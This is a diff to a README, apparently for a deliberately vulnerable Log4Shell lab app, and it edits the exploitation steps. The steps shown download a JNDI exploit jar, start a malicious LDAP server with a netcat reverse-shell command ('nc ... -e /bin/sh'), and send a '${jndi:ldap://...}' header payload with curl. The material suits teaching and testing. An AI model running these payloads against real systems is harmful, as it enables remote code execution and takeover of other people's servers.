@@ -26,7 +26,7 @@ docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 * Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
 
 ```bash
-wget wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
+wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
 
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C nc <privateIP> 8083 -e /bin/sh -A <privateIP>
 ```
@@ -34,7 +34,7 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C nc <privateIP> 8083 -e 
 * Then, trigger the exploit using:
 
 ```bash
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/<randomString>}'
 ```
 
 * Then, listen from the attacking machine on the port we want to receive the connection
